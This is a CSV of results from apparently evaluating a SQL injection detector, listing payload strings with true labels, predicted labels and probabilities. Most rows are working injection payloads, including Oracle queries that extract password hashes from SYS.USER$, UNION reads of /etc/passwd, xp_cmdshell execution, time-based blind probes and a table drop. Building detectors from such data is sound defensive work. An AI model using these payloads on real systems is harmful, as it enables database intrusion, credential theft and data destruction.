text,source,true_label,pred_label,prob_sqli,correct
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999665021896362,1
'||UTL_HTTP.REQUEST,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999727010726929,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
'||utl_http.request ( 'httP://192.168.1.1/' ) ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999970555305481,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999532699584961,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999752044677734,1
' or uid like '%,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999756813049316,1
'; exec xp_regread,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999756813049316,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999665021896362,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999641180038452,1
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999749660491943,1
'  ( select top 1,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.99997878074646,1
' or 1 = 1 /*,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999772310256958,1
21 %,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999688863754272,1
' and 1 in  ( select var from temp ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999773502349854,1
'  )  )   or   (  (  'x'  )  )   =   (  (  'x,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999799728393555,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999657869338989,1
'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999781847000122,1
%21,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999661445617676,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999537467956543,1
' or '1' = '1,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999749660491943,1
"' union select * from users where login  =  char ( 114,111,111,116 ) ;",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999768733978271,1
' or 1 = 1--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999773502349854,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999536275863647,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999725818634033,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
' or 2 > 1,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999758005142212,1
' ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999743700027466,1
'sleep 50',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999688863754272,1
%28,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999650716781616,1
'&',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999754428863525,1
' -- &password =,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999738931655884,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999651908874512,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999954104423523,1
"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999812841415405,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999657869338989,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962329864502,1
' or '' ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999780654907227,1
' ; drop table temp --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999743700027466,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999665021896362,1
' or 'something' like 'some%',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999710321426392,1
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999805688858032,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999666213989258,1
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999730587005615,1
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999805688858032,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999656677246094,1
' or 1 = 1,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999765157699585,1
' --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999967098236084,1
' or 1/*,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999775886535645,1
'||'6,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999977707862854,1
'^',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999736547470093,1
' or 0 = 0 --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999759197235107,1
"' union  ( select NULL,  ( select @@version  )  )   --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999793767929077,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
"' || myappadmin.adduser ( 'admin', 'newpass' )  || '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999734163284302,1
' )  or true--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999774694442749,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999665021896362,1
' or userid like '%,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999754428863525,1
"' union  ( select NULL, NULL,  ( select @@version  )  )   --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999792575836182,1
' union  ( select @@version )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999785423278809,1
' or ''^',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999772310256958,1
"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999792575836182,1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999797344207764,1
' or 2 between 1 and 3,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999717473983765,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
' or 'a' = 'a,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999760389328003,1
' union all select @@version--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999977707862854,1
' or  ( EXISTS ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999971866607666,1
'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999732971191406,1
"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999792575836182,1
' UNION SELECT,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999685287475586,1
' or user like '%,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999755620956421,1
' or ''-',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999761581420898,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999655485153198,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999653100967407,1
' )  or  ( 'x' )  =  ( 'x,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999791383743286,1
' or 'something'  =  'some'+'thing',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999780654907227,1
' group by userid having 1 = 1--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999768733978271,1
' or 0 = 0 #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999778270721436,1
28 %,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999653100967407,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999692440032959,1
' or ''&',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999774694442749,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
' or username like char ( 37 ) ;,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999737739562988,1
+sqlvuln,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999752938747406,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999537467956543,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999656677246094,1
' or 'x' = 'x,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999760389328003,1
' having 1 = 1--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999977707862854,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999665021896362,1
' )  or  ( 'a' = 'a,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999786615371704,1
' or username like '%,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999740123748779,1
' or uname like '%,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999975323677063,1
"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999803304672241,1
' or 1 --',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999768733978271,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999657869338989,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999520778656006,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999661445617676,1
' or '' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999774694442749,1
'; exec master..xp_cmdshell,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999740123748779,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999532699584961,1
' UNION ALL SELECT,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999727010726929,1
' union select,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999786615371704,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999662637710571,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999948263168335,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999662637710571,1
"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999724626541138,1
"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999792575836182,1
' or 3 = 3,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999758005142212,1
' or 1 = 1 --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999762773513794,1
' or 'text' > 't',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999688863754272,1
' or ''*',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999772310256958,1
'sqlattempt1,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,0,5.1132719818269834e-05,0
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999796152114868,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999687671661377,1
031003000270000,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,0,5.673040504916571e-05,0
' or username is not NULL or username  =  ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999774694442749,1
